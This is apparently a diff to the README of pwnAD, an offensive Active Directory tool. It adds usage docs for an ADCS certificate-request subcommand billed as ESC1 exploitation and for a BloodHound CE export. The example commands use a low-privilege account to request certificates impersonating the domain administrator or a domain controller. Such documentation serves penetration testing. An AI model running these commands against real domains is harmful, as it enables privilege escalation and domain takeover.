@@ -55,11 +55,23 @@ pwnAD [auth options] get <subcommand> [arguments]
 | `passwords_dont_expire` | Accounts with non-expiring passwords |
 | `spn` | Accounts with Service Principal Names |
 
-### Other
+### ADCS
 
 | Subcommand | Description |
 |------------|-------------|
 | `CA` | Certificate Authorities |
+| `adcs_req` | Request a certificate from ADCS (ESC1 exploitation via MS-ICPR) |
+
+### Export
+
+| Subcommand | Description |
+|------------|-------------|
+| `bloodhound` | Export domain data to BloodHound CE format (zip) |
+
+### Other
+
+| Subcommand | Description |
+|------------|-------------|
 | `OU` | Organizational Units |
 | `containers` | AD containers |
 | `accounts_with_sid_histoy` | Accounts with SID history |
@@ -131,6 +143,41 @@ pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get CA
 pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get computers
 ```
 
+### ADCS Certificate Request
+
+```bash
+# Request a certificate using a vulnerable template (ESC1)
+pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' get adcs_req \
+  -ca CORP-CA -template VulnTemplate -upn administrator@domain.local
+
+# With custom subject and output path
+pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' get adcs_req \
+  -ca CORP-CA -template VulnTemplate -upn admin@domain.local \
+  -subject "CN=Administrator" -o admin.pfx
+
+# With DNS SAN
+pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' get adcs_req \
+  -ca CORP-CA -template VulnTemplate -dns dc01.domain.local
+```
+
+### BloodHound CE Export
+
+```bash
+# Export all collection methods
+pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get bloodhound -c all
+
+# DC-only collection (LDAP only, no SMB connections)
+pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get bloodhound -c dconly
+
+# Specific methods with custom DNS and output directory
+pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get bloodhound \
+  -c group,acl,trusts -ns 192.168.1.10 -o /tmp/bh-export
+
+# With filename prefix, custom workers, exclude DCs
+pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get bloodhound \
+  -c all --prefix myexport -w 20 --exclude-dcs
+```
+
 ## Interactive Mode Usage
 
 ```bash
@@ -172,4 +219,10 @@ get RBCD
 get DC
 get CA
 get computers
+
+# 6. ADCS abuse
+get adcs_req -ca CORP-CA -template VulnTemplate -upn administrator@domain.local
+
+# 7. BloodHound CE export
+get bloodhound -c all
 ```
